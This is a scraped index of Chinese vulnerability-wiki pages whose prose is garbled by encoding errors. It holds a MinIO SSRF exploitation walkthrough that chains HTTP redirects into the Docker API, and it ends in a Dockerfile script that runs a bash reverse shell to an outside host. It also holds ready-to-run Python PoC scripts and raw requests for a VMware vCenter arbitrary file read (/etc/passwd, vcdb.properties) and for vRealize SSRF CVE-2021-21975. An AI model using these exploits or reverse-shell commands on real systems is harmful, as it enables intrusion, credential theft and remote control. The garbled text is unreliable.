éšç€å·¥ä½œå’Œç”Ÿæ´»ä¸­çš„ä¸€äº›ç¯å¢ƒé€æ¸å¾€äº‘ç«¯è¿ç§»ï¼Œå¯¹è±¡å­˜å‚¨çš„éœ€æ±‚ä¹Ÿé€æ¸å¤šäº†èµ·æ¥ï¼ŒMinIOå°±æ˜¯ä¸€æ¬¾æ”¯æŒéƒ¨ç½²åœ¨ç§æœ‰äº‘çš„å¼€æºå¯¹è±¡å­˜å‚¨ç³»ç»Ÿã€‚MinIOå®Œå…¨å…¼å®¹AWS S3çš„åè®®ï¼Œä¹Ÿæ”¯æŒä½œä¸ºS3çš„ç½‘å…³ï¼Œæ‰€ä»¥åœ¨å…¨çƒè¢«å¹¿æ³›ä½¿ç”¨ï¼Œåœ¨Githubä¸Šå·²æœ‰25kæ˜Ÿæ˜Ÿã€‚MinIOä¸­å­˜åœ¨SSRFæ¼æ´ï¼Œé€šè¿‡æ¼æ´å¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] MinIO æ¼æ´å¤ç° æ—¢ç„¶æˆ‘ä»¬é€‰æ‹©äº†ä»MinIOå…¥æ‰‹ï¼Œé‚£ä¹ˆå…ˆäº†è§£ä¸€ä¸‹MinIOã€‚å…¶å®æˆ‘å‰é¢ä¹Ÿè¯´äº†ï¼Œå› ä¸ºå¹³æ—¶ç”¨åˆ°MinIOçš„æ—¶å€™å¾ˆå¤šï¼Œæ‰€ä»¥è¿™ä¸€æ­¥å¯ä»¥çœç•¥äº†ã€‚å…¶ä½¿ç”¨Goå¼€å‘ï¼Œæä¾›HTTPæ¥å£ï¼Œè€Œä¸”è¿˜æä¾›äº†ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œåä¸ºâ€œMinIO Browserâ€ã€‚å½“ç„¶ï¼Œå‰ç«¯é¡µé¢å°±æ˜¯ä¸€ä¸ªç™»é™†æ¥å£ï¼Œä¸çŸ¥é“å£ä»¤æ— æ³•ç™»å½•ã€‚ é‚£ä¹ˆä»å…¥å£ç‚¹ï¼ˆå‰ç«¯æ¥å£ï¼‰å¼€å§‹å¯¹å…¶è¿›è¡Œä»£ç å®¡è®¡å§ã€‚ åœ¨User-Agentæ»¡è¶³æ­£åˆ™.*Mozilla.*çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å³å¯è®¿é—®MinIOçš„å‰ç«¯æ¥å£ï¼Œå‰ç«¯æ¥å£æ˜¯ä¸€ä¸ªè‡ªå·±å®ç°çš„JsonRPCï¼š æˆ‘ä»¬æ„Ÿå…´è¶£çš„å°±æ˜¯å…¶é‰´æƒçš„æ–¹æ³•ï¼Œéšä¾¿æ‰¾åˆ°ä¸€ä¸ªRPCæ–¹æ³•ï¼Œå¯è§å…¶å¼€å¤´è°ƒç”¨äº†webRequestAuthenticateï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹ï¼Œå‘ç°è¿™é‡Œç”¨çš„æ˜¯jwté‰´æƒï¼š jwtå¸¸è§çš„æ”»å‡»æ–¹æ³•ä¸»è¦æœ‰ä¸‹é¢è¿™å‡ ç§ï¼š å°†algè®¾ç½®ä¸ºNoneï¼Œå‘Šè¯‰æœåŠ¡å™¨ä¸è¿›è¡Œç­¾åæ ¡éªŒ å¦‚æœalgä¸ºRSAï¼Œå¯ä»¥å°è¯•ä¿®æ”¹ä¸ºHS256ï¼Œå³å‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨å…¬é’¥è¿›è¡Œç­¾åçš„æ ¡éªŒ çˆ†ç ´ç­¾åå¯†é’¥ æŸ¥çœ‹MinIOçš„JWTæ¨¡å—ï¼Œå‘ç°å…¶ä¸­å¯¹algè¿›è¡Œäº†æ ¡éªŒï¼Œåªå…è®¸ä»¥ä¸‹ä¸‰ç§ç­¾åæ–¹æ³•ï¼š è¿™å°±å µæ­»äº†å‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œçˆ†ç ´å½“ç„¶å°±æ›´åˆ«è¯´äº†ï¼Œé€šå¸¸ä»…ä½œä¸ºæ²¡åŠæ³•çš„æƒ…å†µä¸‹çš„æ‰‹æ®µã€‚å½“ç„¶ï¼ŒMinIOä¸­ä½¿ç”¨ç”¨æˆ·çš„å¯†ç ä½œä¸ºç­¾åçš„å¯†é’¥ï¼Œè¿™ä¸ªå…¶å®ä¼šè®©çˆ†ç ´å˜åœ°ç®€å•ä¸€äº›ã€‚ é‰´æƒè¿™å—æ²¡å•¥çªç ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹çœ‹ï¼Œæœ‰å“ªäº›RPCæ¥å£æ²¡æœ‰è¿›è¡Œæƒé™éªŒè¯ã€‚ å¾ˆå¿«æ‰¾åˆ°äº†ä¸€ä¸ªæ¥å£ï¼ŒLoginSTSã€‚è¿™ä¸ªæ¥å£å…¶å®æ˜¯AWS STSç™»å½•æ¥å£çš„ä¸€ä¸ªä»£ç†ï¼Œç”¨äºå°†å‘é€åˆ°JsonRPCçš„è¯·æ±‚è½¬å˜æˆSTSçš„æ–¹å¼è½¬å‘ç»™æœ¬åœ°çš„9000ç«¯å£ï¼ˆä¹Ÿå°±è¿˜æ˜¯ä»–è‡ªå·±ï¼Œå› ä¸ºå®ƒæ˜¯å…¼å®¹AWSåè®®çš„ï¼‰ã€‚ ç®€åŒ–å…¶ä»£ç å¦‚ä¸‹ï¼š // LoginSTS - STS user login handler. func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error { ctx := newWebContext(r, args, \"WebLoginSTS\") v := url.Values{} v.Set(\"Action\", webIdentity) v.Set(\"WebIdentityToken\", args.Token) v.Set(\"Version\", stsAPIVersion) scheme := \"http\" // ... u := &url.URL{ Scheme: scheme, Host: r.Host, } u.RawQuery = v.Encode() req, err := http.NewRequest(http.MethodPost, u.String(), nil) // ... } æ²¡å‘ç°æœ‰é‰´æƒä¸Šçš„ç»•è¿‡é—®é¢˜ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜ã€‚è¿™é‡Œï¼ŒMinIOä¸ºäº†å°†è¯·æ±‚è½¬å‘ç»™â€œè‡ªå·±â€ï¼Œå°±ä»ç”¨æˆ·å‘é€çš„HTTPå¤´Hostä¸­è·å–åˆ°â€œè‡ªå·±çš„åœ°å€â€ï¼Œå¹¶å°†å…¶ä½œä¸ºURLçš„Hostæ„é€ äº†æ–°çš„URLã€‚ è¿™ä¸ªè¿‡ç¨‹æœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ å› ä¸ºè¯·æ±‚å¤´æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æ„é€ ä»»æ„çš„Hostï¼Œè¿›è€Œæ„é€ ä¸€ä¸ªSSRFæ¼æ´ã€‚ æˆ‘ä»¬æ¥å®é™…æµ‹è¯•ä¸€ä¸‹ï¼Œå‘http://192.168.227.131:9000å‘é€å¦‚ä¸‹è¯·æ±‚ï¼Œå…¶ä¸­Hostçš„å€¼æ˜¯æˆ‘æœ¬åœ°ncatå¼€æ”¾çš„ç«¯å£ï¼ˆ192.168.1.142:4444ï¼‰ï¼š POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} æˆåŠŸæ”¶åˆ°è¯·æ±‚ï¼š å¯ä»¥ç¡®å®šè¿™é‡Œå­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´äº†ã€‚ ä»”ç»†è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œä½†æ˜¯Pathå’ŒBodyéƒ½æ²¡æ³•æ§åˆ¶ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰URLä¸­çš„ä¸€ä¸ªå‚æ•°WebIdentityTokenã€‚ ä½†æ˜¯è¿™ä¸ªå‚æ•°ç»è¿‡äº†URLç¼–ç ï¼Œæ— æ³•æ³¨å…¥æ¢è¡Œç¬¦ç­‰å…¶ä»–ç‰¹æ®Šå­—ç¬¦ã€‚è¿™æ ·å°±æ¯”è¾ƒé¸¡è‚‹äº†ï¼Œå¦‚æœä»…ä»ç°åœ¨æ¥çœ‹ï¼Œè¿™ä¸ªSSRFåªèƒ½ç”¨äºæ‰«æç«¯å£ã€‚æˆ‘ä»¬çš„ç›®æ ‡å½“ç„¶ä¸ä»…é™äºæ­¤ã€‚ å¹¸è¿çš„æ˜¯ï¼ŒGoé»˜è®¤çš„httpåº“ä¼šè·Ÿè¸ª302è·³è½¬ï¼Œè€Œä¸”ä¸è®ºæ˜¯GETè¿˜æ˜¯POSTè¯·æ±‚ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥302è·³è½¬æ¥â€œå‡çº§â€SSRFæ¼æ´ã€‚ ä½¿ç”¨PHPæ¥ç®€å•åœ°æ„é€ ä¸€ä¸ª302è·³è½¬ï¼š å°†å…¶ä¿å­˜æˆindex.phpï¼Œå¯åŠ¨ä¸€ä¸ªPHPæœåŠ¡å™¨ï¼š å°†HostæŒ‡å‘è¿™ä¸ªPHPæœåŠ¡å™¨ã€‚è¿™æ ·ï¼Œç»è¿‡ä¸€æ¬¡302è·³è½¬ï¼Œæˆ‘ä»¬æ”¶è·äº†ä¸€ä¸ªå¯ä»¥æ§åˆ¶å®Œæ•´URLçš„GETè¯·æ±‚ï¼š æ”¾å®½äº†ä¸€äº›é™åˆ¶ï¼Œç»“åˆå‰é¢æˆ‘å¯¹è¿™å¥—å†…ç½‘çš„äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ”»å‡»Dockeré›†ç¾¤çš„2375ç«¯å£ã€‚ 2375æ˜¯Docker APIçš„æ¥å£ï¼Œä½¿ç”¨HTTPåè®®é€šä¿¡ï¼Œé»˜è®¤ä¸ä¼šç›‘å¬TCPåœ°å€ï¼Œè¿™é‡Œå¯èƒ½æ˜¯ä¸ºäº†æ–¹ä¾¿å†…ç½‘å…¶ä»–æœºå™¨ä½¿ç”¨æ‰€ä»¥å¼€æ”¾åœ¨å†…ç½‘çš„åœ°å€é‡Œäº†ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡SSRFæ¥æ”»å‡»è¿™ä¸ªæ¥å£å‘¢ï¼Ÿ åœ¨Dockeræœªæˆæƒè®¿é—®çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šå¸¸å¯ä»¥ä½¿ç”¨docker runæˆ–docker execæ¥åœ¨ç›®æ ‡å®¹å™¨é‡Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆå¦‚æœä½ ä¸äº†è§£ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼‰ã€‚ä½†æ˜¯ç¿»é˜…Dockerçš„æ–‡æ¡£å¯çŸ¥ï¼Œè¿™ä¸¤ä¸ªæ“ä½œçš„è¯·æ±‚æ˜¯POST /containers/createå’ŒPOST /containers/{id}/execã€‚ ä¸¤ä¸ªAPIéƒ½æ˜¯POSTè¯·æ±‚ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ„é€ çš„SSRFå´æ˜¯ä¸€ä¸ªGETçš„ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿˜è®°å¾—æˆ‘ä»¬æ˜¯æ€æ ·è·å¾—è¿™ä¸ªGETå‹çš„SSRFçš„å—ï¼Ÿé€šè¿‡302è·³è½¬ï¼Œè€Œæ¥å—ç¬¬ä¸€æ¬¡è·³è½¬çš„è¯·æ±‚å°±æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ã€‚ä¸è¿‡æˆ‘ä»¬æ²¡æ³•ç›´æ¥åˆ©ç”¨è¿™ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸ºä»–çš„Pathä¸å¯æ§ã€‚ å¦‚ä½•æ„é€ ä¸€ä¸ªPathå¯æ§çš„POSTè¯·æ±‚å‘¢ï¼Ÿ æˆ‘æƒ³åˆ°äº†307è·³è½¬ï¼Œ307è·³è½¬æ˜¯åœ¨RFC 7231ä¸­å®šä¹‰çš„ä¸€ç§HTTPçŠ¶æ€ç ï¼Œæè¿°å¦‚ä¸‹ï¼š The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307è·³è½¬çš„ç‰¹ç‚¹å°±æ˜¯ä¸ä¼šæ”¹å˜åŸå§‹è¯·æ±‚çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æœåŠ¡ç«¯è¿”å›307çŠ¶æ€ç çš„æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ä¼šæŒ‰ç…§LocationæŒ‡å‘çš„åœ°å€å‘é€ä¸€ä¸ªç›¸åŒæ–¹æ³•çš„è¯·æ±‚ã€‚ æˆ‘ä»¬æ­£å¥½å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæ¥è·å¾—POSTè¯·æ±‚ã€‚ ç®€å•ä¿®æ”¹ä¸€ä¸‹ä¹‹å‰çš„index.phpï¼š å°è¯•SSRFæ”»å‡»ï¼Œæ”¶åˆ°äº†é¢„æœŸçš„è¯·æ±‚ï¼š Bingoï¼Œè·å¾—äº†ä¸€ä¸ªPOSTè¯·æ±‚çš„SSRFï¼Œè™½ç„¶æ²¡æœ‰Bodyã€‚ å›åˆ°Docker APIï¼Œæˆ‘å‘ç°ç°åœ¨ä»ç„¶æ²¡æ³•å¯¹runå’Œexecä¸¤ä¸ªAPIåšåˆ©ç”¨ï¼ŒåŸå› æ˜¯ï¼Œè¿™ä¸¤ä¸ªAPIéƒ½éœ€è¦åœ¨è¯·æ±‚Bodyä¸­ä¼ è¾“JSONæ ¼å¼çš„å‚æ•°ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œçš„SSRFæ— æ³•æ§åˆ¶Bodyã€‚ ç»§ç»­ç¿»è¶ŠDockeræ–‡æ¡£ï¼Œæˆ‘å‘ç°äº†å¦ä¸€ä¸ªAPIï¼ŒBuild an imageï¼š è¿™ä¸ªAPIçš„å¤§éƒ¨åˆ†å‚æ•°æ˜¯é€šè¿‡Query Parametersä¼ è¾“çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ã€‚é˜…è¯»å…¶ä¸­çš„é€‰é¡¹ï¼Œå‘ç°å®ƒå¯ä»¥æ¥å—ä¸€ä¸ªåä¸ºremoteçš„å‚æ•°ï¼Œå…¶è¯´æ˜ä¸ºï¼š A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the fileâ€™s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. è¿™ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ä¸€ä¸ªGitåœ°å€æˆ–è€…ä¸€ä¸ªHTTP URLï¼Œå†…å®¹æ˜¯ä¸€ä¸ªDockerfileæˆ–è€…ä¸€ä¸ªåŒ…å«äº†Dockerfileçš„Gité¡¹ç›®æˆ–è€…ä¸€ä¸ªå‹ç¼©åŒ…ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒDocker APIæ”¯æŒé€šè¿‡æŒ‡å®šè¿œç¨‹URLçš„æ–¹å¼æ¥æ„å»ºé•œåƒï¼Œè€Œä¸éœ€è¦æˆ‘åœ¨æœ¬åœ°å†™å…¥ä¸€ä¸ªDockerfileã€‚ æ‰€ä»¥ï¼Œæˆ‘å°è¯•ç¼–å†™äº†è¿™æ ·ä¸€ä¸ªDockerfileï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿbuildè¿™ä¸ªé•œåƒï¼Œå¦‚æœå¯ä»¥ï¼Œé‚£ä¹ˆæˆ‘çš„4444ç«¯å£åº”è¯¥èƒ½æ”¶åˆ°wgetçš„è¯·æ±‚ï¼š FROM alpine:3.13 RUN wget -T4 http://192.168.1.142:4444/docker/build ç„¶åä¿®æ”¹å‰é¢çš„index.phpï¼ŒæŒ‡å‘Dockeré›†ç¾¤çš„2375ç«¯å£ï¼š è¿›è¡ŒSSRFæ”»å‡»ï¼Œç­‰å¾…äº†ä¸€ä¼šå„¿ï¼Œæœç„¶æ”¶åˆ°è¯·æ±‚äº†ï¼š å®Œç¾ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åœ¨ç›®æ ‡é›†ç¾¤å®¹å™¨é‡Œæ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚ æ­¤æ—¶ç¦»æˆ‘ä»¬çš„ç›®æ ‡ï¼Œæ‹¿ä¸‹MinIOï¼Œè¿˜å·®ä¸€ç‚¹ç‚¹ï¼Œåé¢çš„æ”»å‡»å…¶å®å°±æ¯”è¾ƒç®€å•äº†ã€‚ å› ä¸ºç°åœ¨å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæˆ‘ä»¬å°±ä¸ä¼šå†å—åˆ°SSRFæ¼æ´çš„é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥åå¼¹ä¸€ä¸ªshellï¼Œæˆ–è€…å¯ä»¥ç›´æ¥å‘é€ä»»æ„æ•°æ®åŒ…åˆ°Docker APIï¼Œæ¥è®¿é—®å®¹å™¨ã€‚ç»è¿‡ä¸€é¡¿æµ‹è¯•ï¼Œæˆ‘å‘ç°MinIOè™½ç„¶æ˜¯è¿è¡Œçš„ä¸€ä¸ªserviceï¼Œä½†å®é™…ä¸Šå°±åªæœ‰ä¸€ä¸ªå®¹å™¨ã€‚ æ‰€ä»¥æˆ‘ç¼–å†™äº†ä¸€ä¸ªè‡ªåŠ¨åŒ–æ”»å‡»MinIOå®¹å™¨çš„è„šæœ¬ï¼Œå¹¶å°†å…¶æ”¾åœ¨äº†Dockerfileä¸­ï¼Œè®©å…¶åœ¨Buildçš„æ—¶å€™è¿›è¡Œæ”»å‡»ï¼Œåˆ©ç”¨docker execåœ¨MinIOçš„å®¹å™¨é‡Œæ‰§è¡Œåå¼¹shellçš„å‘½ä»¤ã€‚è¿™ä¸ªDockerfileå¦‚ä¸‹ï¼š FROM alpine:3.13 RUN apk add curl bash jq RUN set -ex && \\ { \\ echo '#!/bin/bash'; \\ echo 'set -ex'; \\ echo 'target=\"http://192.168.227.131:2375\"'; \\ echo 'jsons=$(curl -s -XGET \"${target}/containers/json\" | jq -r \".[] | @base64\")'; \\ echo 'for item in ${jsons[@]}; do'; \\ echo ' name=$(echo $item | base64 -d | jq -r \".Image\")'; \\ echo ' if [[ \"$name\" == *\"minio/minio\"* ]]; then'; \\ echo ' id=$(echo $item | base64 -d | jq -r \".Id\")'; \\ echo ' break'; \\ echo ' fi'; \\ echo 'done'; \\ echo 'execid=$(curl -s -X POST \"${target}/containers/${id}/exec\" -H \"Content-Type: application/json\" --data-binary \"{\\\"Cmd\\\": [\\\"bash\\\", \\\"-c\\\", \\\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\\"]}\" | jq -r \".Id\")'; \\ echo 'curl -s -X POST \"${target}/exec/${execid}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\"'; \\ } | bash è¿™ä¸ªè„šæœ¬æ‰€å¹²çš„äº‹æƒ…æ¯”è¾ƒç®€å•ï¼Œä¸€ä¸ªæ˜¯éå†äº†æ‰€æœ‰å®¹å™¨ï¼Œå¦‚æœå‘ç°å…¶é•œåƒçš„åå­—ä¸­åŒ…å«minio/minioï¼Œåˆ™è®¤ä¸ºè¿™ä¸ªå®¹å™¨å°±æ˜¯MinIOæ‰€åœ¨çš„å®¹å™¨ã€‚æ‹¿åˆ°è¿™ä¸ªå®¹å™¨çš„Idï¼Œç”¨execçš„APIï¼Œåœ¨å…¶ä¸­æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤ Youtube æ¼”ç¤ºé“¾æ¥ å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡Docker APIæ¥è·å–é›†ç¾¤æƒé™ å‚è€ƒæ–‡ç«  https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/","title":"VMware","keywords":"","body":"VMware VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-27 10:40:46 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° VMware vCenterç‰¹å®šç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚ï¼Œå¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ã€ æ¼æ´å½±å“ [!NOTE] VMware vCenter Server 6.5.0a- f ç‰ˆæœ¬ FOFA [!NOTE] title=\"ID_VC_Welcome\" æ¼æ´å¤ç° ä½¿ç”¨POCè®¿é—®æ¼æ´ç‚¹ [!NOTE] Windowsä¸»æœº http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties [!NOTE] Linuxä¸»æœº https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: VMware vCenterä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware\\\\vCenterServer\\cfg\\\\vmware-vpx\\\\vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_linux = requests.get(url=vuln_url_linux, headers=headers, verify=False, timeout=5) response_windows = requests.get(url=vuln_url_windows, headers=headers, verify=False, timeout=5) if \"password\" in response_windows.text and response_windows.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸè¯»å– vcdb.properties \\033[0m\".format(target_url)) print(\"\\033[32m[o] Windowsç³»ç»Ÿ, å“åº”ä¸º:\\n{} \\033[0m\".format(response_windows.text)) elif \"root\" in response_linux.text and response_linux.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸè¯»å– /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] Linuxç³»ç»Ÿ, å“åº”ä¸º:\\n{} \\033[0m\".format(response_linux.text)) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VMware/VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975.html","title":"VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975","keywords":"","body":"VMware vRealize Operations Manager SSRFæ¼æ´ CVE-2021-21975 æ¼æ´æè¿° vRealize Operations Manager APIåŒ…å«æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€‚å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®vRealize Operations Manager APIçš„æ¶æ„æ”»å‡»è€…å¯ä»¥æ‰§è¡ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»(SSRF)ï¼Œä»¥çªƒå–ç®¡ç†å‡­æ®ã€‚ æ¼æ´å½±å“ [!NOTE] VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x FOFA [!NOTE] title=\"vRealize Operations Manager\" æ¼æ´å¤ç° è®¿é—®ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ…å¦‚ä¸‹ POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: VMware vRealize Operations Manager \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.com \\033[0m') print('+------------------------------------------') def POC_1(target_url, v): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json;charset=UTF-8\" } data = '[\"{}\"]'.format(Dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10) if response.status_code == 200 : print(\"\\033[32m[o] ç›®æ ‡ {} å¯èƒ½å­˜åœ¨SSRFæ¼æ´,è¯·æ£€æŸ¥ Dnslog å“åº” \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 